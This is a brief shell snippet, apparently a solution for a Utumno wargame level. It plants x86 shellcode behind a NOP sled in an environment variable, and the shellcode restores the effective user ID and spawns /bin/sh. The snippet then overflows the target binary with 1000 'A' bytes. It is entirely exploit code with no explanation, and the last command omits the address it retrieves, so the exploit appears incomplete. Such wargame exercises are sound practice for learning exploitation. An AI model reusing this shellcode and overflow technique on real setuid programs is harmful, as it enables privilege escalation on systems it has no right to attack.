# Set the environment variables
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# Get EGG's address
/tmp/utumno5_ballban/check_env EGG # 0xffffd9f4


/utumno/utumno7 $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 1000)")